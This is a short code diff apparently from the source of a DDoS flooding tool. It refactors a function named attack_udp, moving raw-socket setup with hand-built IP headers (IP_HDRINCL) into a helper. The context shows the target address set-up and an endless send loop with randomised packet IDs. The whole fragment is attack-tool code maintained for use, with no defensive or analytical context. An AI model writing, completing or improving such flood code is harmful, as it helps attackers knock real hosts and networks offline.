@@ -5,7 +5,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include "udp_attack.h"
-#include "checksum.h"
+#include "utils.h"
 #include "types.h"
 
 void attack_udp(struct target_data *target)
@@ -35,16 +35,7 @@ void attack_udp(struct target_data *target)
 	target->addr.sin_family = AF_INET;
 	target->addr.sin_port = 0;
 	target->addr.sin_addr.s_addr = target->target_addr;
-
-	/* initialize raw socket */
-	if ((target->sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) {
-		exit(EXIT_FAILURE);
-	}
-
-	int enable = 1;
-	if (setsockopt(target->sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(int)) == -1) {
-		exit(EXIT_FAILURE);
-	}
+	target->sockfd = init_socket(IPPROTO_UDP);
 
 	while (1) {
 		iph->ident = rand() & 0xffff;
